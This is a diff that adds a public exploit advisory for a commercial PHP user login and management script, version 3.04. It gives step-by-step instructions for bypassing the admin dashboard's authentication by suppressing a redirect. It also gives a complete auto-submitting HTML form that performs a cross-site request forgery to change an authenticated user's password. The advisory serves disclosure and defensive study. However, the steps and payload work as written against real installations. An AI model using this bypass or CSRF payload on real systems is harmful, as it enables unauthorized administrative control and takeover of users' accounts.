@@ -1,0 +1,53 @@
+-----------------------------------------------------------------------------------
+|<!-- 
+# Exploit Title:  User Login and Management PHP Script - multiple vulnerabilities 
+# Exploit Author: Ali BawazeEer || https://sa.linkedin.com/in/alibawazeeer
+# Dork: N/A
+# Date: 29.08.2017
+# software link : https://www.codester.com/items/469/user-login-and-management-php-script
+# demo : http://froiden.cloudapp.net/LoginDashboard/index.php
+# Version: 3.04
+# Category: Webapps
+# Tested on: windows64bit / mozila firefox 
+# 
+#
+|--!>
+
+|----------------------------------------------------------------------------------
+
+1) admin dashboard authentication bypass 
+
+Description : An Attackers are able to completely compromise the web application built upon
+the user login and management php script as they can gain access to the admin panel and 
+manage other users as an admin without  authentication!
+ 
+ 
+Step 1: Create a rule in No-Redirect Add-on: ^http://localhost/LoginDashboard/admin/index.php
+Step 2: Access http://localhost/LoginDashboard/admin/dashboard.php
+ 
+ 
+Risk : Unauthenticated attackers are able to gain full access to the administrator panel
+and thus have total control over the application and users , including add admin user .. etc
+
+
+|----------------------------------------------------------------------------------
+
+
+2) account takeover - cross side request forgery 
+
+
+Description : attacker can craft a malicious page and send it to any user who is already authenticated to change the password 
+
+> exploitation < 
+
+
+<html>
+<body>
+<form name="csrf_form" action="http://localhost/LoginDashboard/code/ajaxChangePassword.php?password=1234567890&cpassword=1234567890" method="POST">
+
+<script type="text/javascript">document.csrf_form.submit();</script>
+</body>
+</html>
+
+
+|-----------------------------------------EOF-----------------------------------------
